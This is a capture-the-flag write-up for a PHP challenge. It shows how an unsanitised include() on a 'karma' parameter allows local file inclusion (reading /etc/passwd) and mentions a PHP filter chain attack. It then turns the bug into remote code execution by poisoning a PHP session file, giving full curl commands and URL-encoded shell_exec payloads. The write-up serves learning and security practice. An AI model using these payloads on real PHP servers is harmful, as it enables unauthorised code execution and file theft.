# Forbidden Jutsu Writeup 

## Recon

Recon was pretty straightforward, as there's some source code right into the homepage:

![2022-12-29_15-00](https://user-images.githubusercontent.com/33382014/209969846-cb3e6293-79ad-4c06-b25f-5150f363e2a6.png)

What this PHP does basically is:

- session_start(): creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie. 
- This session takes one parameter, i.e. karma
- This session is identified by the parameter `$_SESSION["boruto"]`, which is set to the value of the "karma" parameter. 
- `include()`, aka The Safest Function of The World, includes and evaluates the specified file.   It will include and evaluate any file that we pass with the "karma" parameter. LFI DETECTED!

## LFI

Let's try it:


`http://44.200.237.73/?karma=/etc/passwd`

![2022-12-29_14-59](https://user-images.githubusercontent.com/33382014/209969927-91ca8cd3-9cbe-4b46-b4f9-91bd25a959df.png)

It works without any need for parameter manipulation such as `../../../../../` or null bytes. I tried to read other relevant files such as conf files but had no success. The hint to what do after is right in the homepage: 

`//Our secret is in the root directory; You can't reveal it without achieving RCE Jutsu ;)`

I'm not a Naruto/Boruto fan but I'm pretty sure there's no RCE Jutsu in the manga/anime so we will have to work our chakras to find a Hacker's way to RCE instead of a Ninja's one. 

The only RCE other than the intend one that kinda works is PHP Filters Chain attack. Further details on this attack can be found here https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html and the PoC can be found here https://github.com/synacktiv/php_filter_chain_generator. 

![2022-12-29_15-14](https://user-images.githubusercontent.com/33382014/209970011-1e3cb01e-65eb-48d0-94e6-8fb043e420b3.png)

![2022-12-29_15-13](https://user-images.githubusercontent.com/33382014/209970029-eda5f1a3-2cb8-4c3c-9fa3-b6bd025cecf9.png)


As can be seen, you can execute remote code that way, but it was very difficult to try to achieve anything concrete with it, firstly because the output was not well rendered or there was no output at all, secondly because the server refuses to load very lengthy payloads and that limitated this vector even more. The only relevant info that I was able to get is that sessions are stored at `/tmp/sess_<SESSION>` by supplying the following code to the filter chain generator: `'<?php echo exec("ls /tmp"); ?>  '`. 

By looking again at the source code, the natural step is to fuzz with the `$_SESSION["boruto"]` parameter. Spoiler: that's the way to achieve RCE Jutsu.  

How to enable RCE jutsu:

1. Create a new session with a cookie value and the PHP payload as the karma parameter: `curl http://44.200.237.73 -H 'Cookie: PHPSESSID=jutsu' curl http://44.200.237.73/?karma=%3c%3f%70%68%70%20%24%6f%3d%73%68%65%6c%6c%5f%65%78%65%63%28%27%6c%73%20%2f%27%29%3b%65%63%68%6f%20%22%24%6f%22%3b%20%3f%3e` The first curl command sets the session as `jutsu`, which will be located at `/tmp/sess_jutsu`. The second one sets the karma parameter to <?php $o=shell_exec('ls /');echo "$o"; ?> with URL-encoding. I'm giving both commands at the same time because it's not always clear for how long that session is going to be kept alive.
2. By going to http://44.200.237.73/?karma=/tmp/sess_jutsu you can see the results of the listing, and the flag file as well. 

![2022-12-29_15-35](https://user-images.githubusercontent.com/33382014/209970089-2e31eba8-acc7-4756-b4bd-070a8b5147d3.png)


3. Now all that is left to do is to repeat step 1 with the following value as the karma parameter: <?php $o=shell_exec('cat /seCretJutsuToKillBorUtoKun.txt');echo "$o"; ?>
4. `curl http://44.200.237.73 -H 'Cookie: PHPSESSID=jutsu' curl http://44.200.237.73/?karma=%3c%3f%70%68%70%20%24%6f%3d%73%68%65%6c%6c%5f%65%78%65%63%28%27%63%61%74%20%2f%73%65%43%72%65%74%4a%75%74%73%75%54%6f%4b%69%6c%6c%42%6f%72%55%74%6f%4b%75%6e%2e%74%78%74%27%29%3b%65%63%68%6f%20%22%24%6f%22%3b%20%3f%3e` is the final payload.
5. Access http://44.200.237.73/?karma=/tmp/sess_jutsu to retrieve the flag. 

![2022-12-29_15-41](https://user-images.githubusercontent.com/33382014/209970118-fad333bd-8787-4bfd-a5ac-5aef9eb7efc0.png)


Thanks to everyone at Yogosha for this CTF. It was very fun and challenging!
